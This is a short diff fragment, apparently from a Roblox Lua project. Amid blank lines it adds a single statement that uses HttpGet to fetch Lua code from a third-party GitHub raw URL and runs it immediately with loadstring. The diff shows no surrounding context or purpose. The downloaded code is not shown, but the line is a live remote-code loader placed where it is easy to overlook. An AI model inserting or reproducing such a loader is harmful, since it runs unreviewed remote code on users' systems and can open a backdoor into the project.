@@ -119,7 +119,7 @@
 
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/therangedpayeer/client-sided-chat/refs/heads/main/dear%20sigma%20yuri%20user."))()
 
 
 
